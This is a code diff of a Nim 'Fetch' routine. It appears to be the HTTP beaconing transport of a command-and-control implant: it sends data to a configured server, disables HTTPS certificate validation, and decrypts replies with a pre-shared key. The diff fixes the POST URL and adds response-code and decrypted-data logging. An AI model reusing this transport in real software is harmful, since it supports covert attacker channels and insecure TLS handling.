@@ -55,6 +55,7 @@ proc Fetch*(curConfig: Config, bdata: string, isGet: bool): Future[string] {.asy
     #curConfig.Servers.sort(serverCmp)
     #curConfig = temp
     var req: Request
+    var responseCode: int
     try:
         if isGet:
             when not defined(release):
@@ -62,30 +63,35 @@ proc Fetch*(curConfig: Config, bdata: string, isGet: bool): Future[string] {.asy
                 echo "dataToSend: ", dataToSend
                 echo "curConfig: ", $(curConfig)
                 echo "get url: ", $(parseUri(curConfig.Servers[0].Domain) / curConfig.GetUrl ? {curConfig.Param: dataToSend})
+                #echo "get url: ", $(parseUri(curConfig.Servers[0].Domain)) & curConfig.GetUrl & "?" & curConfig.Param
                 echo "making request"
             
             #result = await getContent(client, $(parseUri(curConfig.Servers[0].Domain) / curConfig.GetUrl ? {curConfig.Param: dataToSend}))
             
-            req = Request(url : parseUrl($(parseUri(curConfig.Servers[0].Domain) / curConfig.GetUrl ? {curConfig.Param : dataToSend})), verb : "get", headers : headers, allowAnyHttpsCertificate : true)
+            req = Request(url : parseUrl($(parseUri(curConfig.Servers[0].Domain) / curConfig.GetUrl ? {curConfig.Param: dataToSend})), verb : "get", headers : headers,  allowAnyHttpsCertificate : true)
             
             let pupyresponse = fetch(req)
+            responseCode = pupyresponse.code
             result = pupyresponse.body
         else:
             when not defined(release):
-                echo "post url: ", $(parseUri(curConfig.Servers[0].Domain) / curConfig.PostUrl), " data: ", dataToSend
+                echo "post url: ", $(parseUri(curConfig.Servers[0].Domain) / curConfig.PostUrl)
+                echo "dataToSend: ", dataToSend
                 echo "sending data: ", tempData
 
             
             
-            req = Request(url : parseUrl($(parseUri(curConfig.Servers[0].Domain) / curConfig.GetUrl)), verb : "post", headers : headers, body : dataToSend, allowAnyHttpsCertificate : true)
+            req = Request(url : parseUrl($(parseUri(curConfig.Servers[0].Domain) / curConfig.PostUrl)), verb : "post", headers : headers, body : dataToSend, allowAnyHttpsCertificate : true)
             let pupyresponse = fetch(req)
+            responseCode = pupyresponse.code
             result = pupyresponse.body
         when not defined(release):
+            echo "response code: ", $(responseCode)
             echo "Just received data back from get or post request: ", result
         when defined(AESPSK):
-            #echo "inside post request just received back: encrypted: ", result
+            echo "inside post request just received back: encrypted: ", result
             result = decryptStr(curConfig.PayloadUUID, curConfig.Psk, result)
-            #echo "after post request decrypted data: ", result
+            echo "after post request decrypted data: ", result
     except:
         let
             e = getCurrentException()
